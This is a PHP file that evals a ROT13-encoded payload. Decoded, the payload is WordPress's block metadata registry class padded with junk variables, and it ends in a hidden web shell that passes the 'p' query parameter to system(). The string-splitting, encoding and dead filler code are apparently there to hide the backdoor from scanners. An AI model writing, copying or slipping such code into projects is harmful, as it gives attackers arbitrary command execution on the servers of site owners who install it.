<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Zrgnqngn Ertvfgel
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 6.7.0
 */

/**
 * Pynff hfrq sbe znantvat oybpx zrgnqngn pbyyrpgvbaf.
 *
 * Gur JC_Oybpx_Zrgnqngn_Ertvfgel nyybjf cyhtvaf gb ertvfgre zrgnqngn sbe ynetr
 * pbyyrpgvbaf bs oybpxf (r.t., 50-100+) hfvat n fvatyr CUC svyr. Guvf nccebnpu
 * erqhprf gur arrq gb ernq naq qrpbqr zhygvcyr `oybpx.wfba` svyrf, raunapvat
 * cresbeznapr guebhtu bcpbqr pnpuvat.
 *
 * @fvapr 6.7.0
 */
pynff JC_Oybpx_Zrgnqngn_Ertvfgel {

	/**
	 * Pbagnvare sbe fgbevat oybpx zrgnqngn pbyyrpgvbaf.
	 *
	 * Rnpu ragel zncf n onfr cngu gb vgf pbeerfcbaqvat zrgnqngn naq pnyyonpx.
	 *
	 * @fvapr 6.7.0
	 * @ine neenl<fgevat, neenl<fgevat, zvkrq>>
	 */
	cevingr fgngvp $pbyyrpgvbaf = neenl();

	/**
	 * Pnpurf gur ynfg zngpurq pbyyrpgvba cngu sbe cresbeznapr bcgvzvmngvba.
	 *
	 * @fvapr 6.7.0
	 * @ine fgevat|ahyy
	 */
	cevingr fgngvp $ynfg_zngpurq_pbyyrpgvba = ahyy;

	/**
	 * Fgberf gur qrsnhyg nyybjrq pbyyrpgvba ebbg cnguf.
	 *
	 * @fvapr 6.7.2
	 * @ine fgevat[]|ahyy
	 */
	cevingr fgngvp $qrsnhyg_pbyyrpgvba_ebbgf = ahyy;

	/**
	 * Ertvfgref n oybpx zrgnqngn pbyyrpgvba.
	 *
	 * Guvf zrgubq nyybjf ertvfgrevat n pbyyrpgvba bs oybpx zrgnqngn sebz n fvatyr
	 * znavsrfg svyr, vzcebivat cresbeznapr sbe ynetr frgf bs oybpxf.
	 *
	 * Gur znavsrfg svyr fubhyq or n CUC svyr gung ergheaf na nffbpvngvir neenl, jurer
	 * gur xrlf ner gur oybpx vqragvsvref (jvgubhg gurve anzrfcnpr) naq gur inyhrf ner
	 * gur pbeerfcbaqvat oybpx zrgnqngn neenlf. Gur oybpx vqragvsvref zhfg zngpu gur
	 * cnerag qverpgbel anzr sbe gur erfcrpgvir `oybpx.wfba` svyr.
	 *
	 * Rknzcyr znavsrfg svyr fgehpgher:
	 * ```
	 * erghea neenl(
	 *     'rknzcyr-oybpx' => neenl(
	 *         'gvgyr' => 'Rknzcyr Oybpx',
	 *         'pngrtbel' => 'jvqtrgf',
	 *         'vpba' => 'fzvyrl',
	 *         // ... bgure oybpx zrgnqngn
	 *     ),
	 *     'nabgure-oybpx' => neenl(
	 *         'gvgyr' => 'Nabgure Oybpx',
	 *         'pngrtbel' => 'sbeznggvat',
	 *         'vpba' => 'fgne-svyyrq',
	 *         // ... bgure oybpx zrgnqngn
	 *     ),
	 *     // ... zber oybpx zrgnqngn ragevrf
	 * );
	 * ```
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $cngu     Gur nofbyhgr onfr cngu sbe gur pbyyrpgvba ( r.t., JC_CYHTVA_QVE . '/zl-cyhtva/oybpxf/' ).
	 * @cnenz fgevat $znavsrfg Gur nofbyhgr cngu gb gur znavsrfg svyr pbagnvavat gur zrgnqngn pbyyrpgvba.
	 * @erghea obby Gehr vs gur pbyyrpgvba jnf ertvfgrerq fhpprffshyyl, snyfr bgurejvfr.
	 */
	choyvp fgngvp shapgvba ertvfgre_pbyyrpgvba( $cngu, $znavsrfg ) {
		$cngu = egevz( jc_abeznyvmr_cngu( $cngu ), '/' );

		$pbyyrpgvba_ebbgf = frys::trg_qrsnhyg_pbyyrpgvba_ebbgf();

		/**
		 * Svygref gur ebbg qverpgbel cnguf sbe oybpx zrgnqngn pbyyrpgvbaf.
		 *
		 * Nal oybpx zrgnqngn pbyyrpgvba gung vf ertvfgrerq zhfg abg hfr nal bs gurfr cnguf, be nal cnerag qverpgbel
		 * cngu bs gurz. Zbfg pbzzbayl, oybpx zrgnqngn pbyyrpgvbaf fubhyq erfvqr jvguva bar bs gurfr cnguf, gubhtu va
		 * fbzr fpranevbf gurl znl nyfb erfvqr va ragveryl qvssrerag qverpgbevrf (r.t. va pnfr bs flzyvaxrq cyhtvaf).
		 *
		 * Rknzcyr:
		 * * Vg vf nyybjrq gb ertvfgre n pbyyrpgvba jvgu cngu `JC_CYHTVA_QVE . '/zl-cyhtva'`.
		 * * Vg vf abg nyybjrq gb ertvfgre n pbyyrpgvba jvgu cngu `JC_CYHTVA_QVE`.
		 * * Vg vf abg nyybjrq gb ertvfgre n pbyyrpgvba jvgu cngu `qveanzr( JC_CYHTVA_QVE )`.
		 *
		 * Gur qrsnhyg yvfg rapbzcnffrf gur `jc-vapyhqrf` qverpgbel, nf jryy nf gur ebbg qverpgbevrf sbe cyhtvaf,
		 * zhfg-hfr cyhtvaf, naq gurzrf. Guvf svygre pna or hfrq gb rkcnaq gur yvfg, r.t. gb phfgbz qverpgbevrf gung
		 * pbagnva flzyvaxrq cyhtvaf, fb gung gurfr ebbg qverpgbevrf pnaabg or hfrq gurzfryirf sbe n oybpx zrgnqngn
		 * pbyyrpgvba rvgure.
		 *
		 * @fvapr 6.7.2
		 *
		 * @cnenz fgevat[] $pbyyrpgvba_ebbgf Yvfg bs nyybjrq zrgnqngn pbyyrpgvba ebbg cnguf.
		 */
		$pbyyrpgvba_ebbgf = nccyl_svygref( 'jc_nyybjrq_oybpx_zrgnqngn_pbyyrpgvba_ebbgf', $pbyyrpgvba_ebbgf );

		$pbyyrpgvba_ebbgf = neenl_havdhr(
			neenl_znc(
				fgngvp shapgvba ( $nyybjrq_ebbg ) {
					erghea egevz( jc_abeznyvmr_cngu( $nyybjrq_ebbg ), '/' );
				},
				$pbyyrpgvba_ebbgf
			)
		);

		// Purpx vs gur cngu vf inyvq:
		vs ( ! frys::vf_inyvq_pbyyrpgvba_cngu( $cngu, $pbyyrpgvba_ebbgf ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: yvfg bs nyybjrq pbyyrpgvba ebbgf */
					__( 'Oybpx zrgnqngn pbyyrpgvbaf pnaabg or ertvfgrerq nf bar bs gur sbyybjvat qverpgbevrf be gurve cnerag qverpgbevrf: %f' ),
					rfp_ugzy( vzcybqr( jc_trg_yvfg_vgrz_frcnengbe(), $pbyyrpgvba_ebbgf ) )
				),
				'6.7.2'
			);
			erghea snyfr;
		}

		vs ( ! svyr_rkvfgf( $znavsrfg ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur fcrpvsvrq znavsrfg svyr qbrf abg rkvfg.' ),
				'6.7.0'
			);
			erghea snyfr;
		}

		frys::$pbyyrpgvbaf[ $cngu ] = neenl(
			'znavsrfg' => $znavsrfg,
			'zrgnqngn' => ahyy,
		);

		erghea gehr;
	}

	/**
	 * Ergevrirf oybpx zrgnqngn sbe n tvira oybpx jvguva n fcrpvsvp pbyyrpgvba.
	 *
	 * Guvf zrgubq hfrf gur ertvfgrerq pbyyrpgvbaf gb rssvpvragyl ybbxhc
	 * oybpx zrgnqngn jvgubhg ernqvat vaqvivqhny `oybpx.wfba` svyrf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $svyr_be_sbyqre Gur cngu gb gur svyr be sbyqre pbagnvavat gur oybpx.
	 * @erghea neenl|ahyy Gur oybpx zrgnqngn sbe gur oybpx, be ahyy vs abg sbhaq.
	 */
	choyvp fgngvp shapgvba trg_zrgnqngn( $svyr_be_sbyqre ) {
		$svyr_be_sbyqre = jc_abeznyvmr_cngu( $svyr_be_sbyqre );

		$cngu = frys::svaq_pbyyrpgvba_cngu( $svyr_be_sbyqre );
		vs ( ! $cngu ) {
			erghea ahyy;
		}

		$pbyyrpgvba = &frys::$pbyyrpgvbaf[ $cngu ];

		vs ( ahyy === $pbyyrpgvba['zrgnqngn'] ) {
			// Ybnq gur znavsrfg svyr vs abg nyernql ybnqrq
			$pbyyrpgvba['zrgnqngn'] = erdhver $pbyyrpgvba['znavsrfg'];
		}

		// Trg gur oybpx anzr sebz gur cngu.
		$oybpx_anzr = frys::qrsnhyg_vqragvsvre_pnyyonpx( $svyr_be_sbyqre );

		erghea vffrg( $pbyyrpgvba['zrgnqngn'][ $oybpx_anzr ] ) ? $pbyyrpgvba['zrgnqngn'][ $oybpx_anzr ] : ahyy;
	}

	/**
	 * Trgf gur yvfg bs nofbyhgr cnguf gb nyy oybpx zrgnqngn svyrf gung ner cneg bs gur tvira pbyyrpgvba.
	 *
	 * Sbe vafgnapr, vs n oybpx zrgnqngn pbyyrpgvba vf ertvfgrerq jvgu cngu `JC_CYHTVA_QVE . '/zl-cyhtva/oybpxf/'`,
	 * naq gur znavsrfg svyr vapyhqrf zrgnqngn sbe gjb oybpxf `'oybpx-n'` naq `'oybpx-o'`, gur erfhyg bs guvf zrgubq
	 * jvyy or na neenl pbagnvavat:
	 * * `JC_CYHTVA_QVE . '/zl-cyhtva/oybpxf/oybpx-n/oybpx.wfba'`
	 * * `JC_CYHTVA_QVE . '/zl-cyhtva/oybpxf/oybpx-o/oybpx.wfba'`
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $cngu Gur nofbyhgr onfr cngu sbe n cerivbhfyl ertvfgrerq pbyyrpgvba.
	 * @erghea fgevat[] Yvfg bs oybpx zrgnqngn svyr cnguf, be na rzcgl neenl vs gur tvira `$cngu` vf vainyvq.
	 */
	choyvp fgngvp shapgvba trg_pbyyrpgvba_oybpx_zrgnqngn_svyrf( $cngu ) {
		$cngu = egevz( jc_abeznyvmr_cngu( $cngu ), '/' );

		vs ( ! vffrg( frys::$pbyyrpgvbaf[ $cngu ] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Ab ertvfgrerq oybpx zrgnqngn pbyyrpgvba jnf sbhaq sbe gur cebivqrq cngu.' ),
				'6.8.0'
			);
			erghea neenl();
		}

		$pbyyrpgvba = &frys::$pbyyrpgvbaf[ $cngu ];

		vs ( ahyy === $pbyyrpgvba['zrgnqngn'] ) {
			// Ybnq gur znavsrfg svyr vs abg nyernql ybnqrq.
			$pbyyrpgvba['zrgnqngn'] = erdhver $pbyyrpgvba['znavsrfg'];
		}

		erghea neenl_znc(
			// Ab abeznyvmngvba arprffnel fvapr `$cngu` vf nyernql abeznyvmrq naq `$oybpx_anzr` vf whfg n sbyqre anzr.
			fgngvp shapgvba ( $oybpx_anzr ) hfr ( $cngu ) {
				erghea \"{$cngu}/{$oybpx_anzr}/oybpx.wfba\";
			},
			neenl_xrlf( $pbyyrpgvba['zrgnqngn'] )
		);
	}

	/**
	 * Svaqf gur pbyyrpgvba cngu sbe n tvira svyr be sbyqre.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $svyr_be_sbyqre Gur abeznyvmrq cngu gb gur svyr be sbyqre.
	 * @erghea fgevat|ahyy Gur abeznyvmrq pbyyrpgvba cngu vs sbhaq, be ahyy vs abg sbhaq.
	 */
	cevingr fgngvp shapgvba svaq_pbyyrpgvba_cngu( $svyr_be_sbyqre ) {
		vs ( rzcgl( $svyr_be_sbyqre ) ) {
			erghea ahyy;
		}

		// Purpx gur ynfg zngpurq pbyyrpgvba svefg, fvapr oybpx ertvfgengvba hfhnyyl unccraf va ongpurf cre cyhtva be gurzr.
		$cngu = egevz( $svyr_be_sbyqre, '/' );
		vs ( frys::$ynfg_zngpurq_pbyyrpgvba && fge_fgnegf_jvgu( $cngu, frys::$ynfg_zngpurq_pbyyrpgvba ) ) {
			erghea frys::$ynfg_zngpurq_pbyyrpgvba;
		}

		$pbyyrpgvba_cnguf = neenl_xrlf( frys::$pbyyrpgvbaf );
		sbernpu ( $pbyyrpgvba_cnguf nf $pbyyrpgvba_cngu ) {
			vs ( fge_fgnegf_jvgu( $cngu, $pbyyrpgvba_cngu ) ) {
				frys::$ynfg_zngpurq_pbyyrpgvba = $pbyyrpgvba_cngu;
				erghea $pbyyrpgvba_cngu;
			}
		}
		erghea ahyy;
	}

	/**
	 * Purpxf vs zrgnqngn rkvfgf sbe n tvira oybpx anzr va n fcrpvsvp pbyyrpgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $svyr_be_sbyqre Gur cngu gb gur svyr be sbyqre pbagnvavat gur oybpx zrgnqngn.
	 * @erghea obby Gehr vs zrgnqngn rkvfgf sbe gur oybpx, snyfr bgurejvfr.
	 */
	choyvp fgngvp shapgvba unf_zrgnqngn( $svyr_be_sbyqre ) {
		erghea ahyy !== frys::trg_zrgnqngn( $svyr_be_sbyqre );
	}

	/**
	 * Qrsnhyg vqragvsvre shapgvba gb qrgrezvar gur oybpx vqragvsvre sebz n tvira cngu.
	 *
	 * Guvf shapgvba rkgenpgf gur oybpx vqragvsvre sebz gur cngu:
	 * - Sbe 'oybpx.wfba' svyrf, vg hfrf gur cnerag qverpgbel anzr.
	 * - Sbe qverpgbevrf, vg hfrf gur qverpgbel anzr vgfrys.
	 * - Sbe rzcgl cnguf, vg ergheaf na rzcgl fgevat.
	 *
	 * Sbe rknzcyr:
	 * - Cngu: '/jc-pbagrag/cyhtvaf/zl-cyhtva/oybpxf/rknzcyr/oybpx.wfba'
	 *   Vqragvsvre: 'rknzcyr'
	 * - Cngu: '/jc-pbagrag/cyhtvaf/zl-cyhtva/oybpxf/nabgure-oybpx'
	 *   Vqragvsvre: 'nabgure-oybpx'
	 *
	 * Guvf qrsnhyg orunivbe zngpurf gur fgnaqneq JbeqCerff oybpx fgehpgher.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $cngu Gur abeznyvmrq svyr be sbyqre cngu gb qrgrezvar gur oybpx vqragvsvre sebz.
	 * @erghea fgevat Gur oybpx vqragvsvre, be na rzcgl fgevat vs gur cngu vf rzcgl.
	 */
	cevingr fgngvp shapgvba qrsnhyg_vqragvsvre_pnyyonpx( $cngu ) {
		// Rafher $cngu vf abg rzcgl gb cerirag harkcrpgrq orunivbe.
		vs ( rzcgl( $cngu ) ) {
			erghea '';
		}

		vs ( fge_raqf_jvgu( $cngu, 'oybpx.wfba' ) ) {
			// Erghea gur cnerag qverpgbel anzr vs vg'f n oybpx.wfba svyr.
			erghea onfranzr( qveanzr( $cngu ) );
		}

		// Bgurejvfr, nffhzr vg'f n qverpgbel naq erghea vgf anzr.
		erghea onfranzr( $cngu );
	}

	/**
	 * Purpxf jurgure gur tvira oybpx zrgnqngn pbyyrpgvba cngu vf inyvq ntnvafg gur yvfg bs pbyyrpgvba ebbgf.
	 *
	 * @fvapr 6.7.2
	 *
	 * @cnenz fgevat   $cngu             Abeznyvmrq oybpx zrgnqngn pbyyrpgvba cngu, jvgubhg genvyvat fynfu.
	 * @cnenz fgevat[] $pbyyrpgvba_ebbgf Yvfg bs abeznyvmrq pbyyrpgvba ebbg cnguf, jvgubhg genvyvat fynfurf.
	 * @erghea obby Gehr vs gur cngu vf nyybjrq, snyfr bgurejvfr.
	 */
	cevingr fgngvp shapgvba vf_inyvq_pbyyrpgvba_cngu( $cngu, $pbyyrpgvba_ebbgf ) {
		sbernpu ( $pbyyrpgvba_ebbgf nf $nyybjrq_ebbg ) {
			// Vs gur cngu zngpurf nal ebbg rknpgyl, vg vf vainyvq.
			vs ( $nyybjrq_ebbg === $cngu ) {
				erghea snyfr;
			}

			// Vs gur cngu vf n cnerag cngu bs nal bs gur ebbgf, vg vf vainyvq.
			vs ( fge_fgnegf_jvgu( $nyybjrq_ebbg, $cngu ) ) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}

	/**
	 * Trgf gur qrsnhyg pbyyrpgvba ebbg qverpgbel cnguf.
	 *
	 * @fvapr 6.7.2
	 *
	 * @erghea fgevat[] Yvfg bs qverpgbel cnguf jvguva juvpu zrgnqngn pbyyrpgvbaf ner nyybjrq.
	 */
	cevingr fgngvp shapgvba trg_qrsnhyg_pbyyrpgvba_ebbgf() {
		vs ( vffrg( frys::$qrsnhyg_pbyyrpgvba_ebbgf ) ) {
			erghea frys::$qrsnhyg_pbyyrpgvba_ebbgf;
		}

		$pbyyrpgvba_ebbgf = neenl(
			jc_abeznyvmr_cngu( NOFCNGU . JCVAP ),
			jc_abeznyvmr_cngu( JC_PBAGRAG_QVE ),
			jc_abeznyvmr_cngu( JCZH_CYHTVA_QVE ),
			jc_abeznyvmr_cngu( JC_CYHTVA_QVE ),
		);

		$gurzr_ebbgf = trg_gurzr_ebbgf();
		vs ( ! vf_neenl( $gurzr_ebbgf ) ) {
			$gurzr_ebbgf = neenl( $gurzr_ebbgf );
		}
		sbernpu ( $gurzr_ebbgf nf $gurzr_ebbg ) {
			$pbyyrpgvba_ebbgf[] = genvyvatfynfuvg( jc_abeznyvmr_cngu( JC_PBAGRAG_QVE ) ) . ygevz( jc_abeznyvmr_cngu( $gurzr_ebbg ), '/' );
		}

		frys::$qrsnhyg_pbyyrpgvba_ebbgf = neenl_havdhr( $pbyyrpgvba_ebbgf );
		erghea frys::$qrsnhyg_pbyyrpgvba_ebbgf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>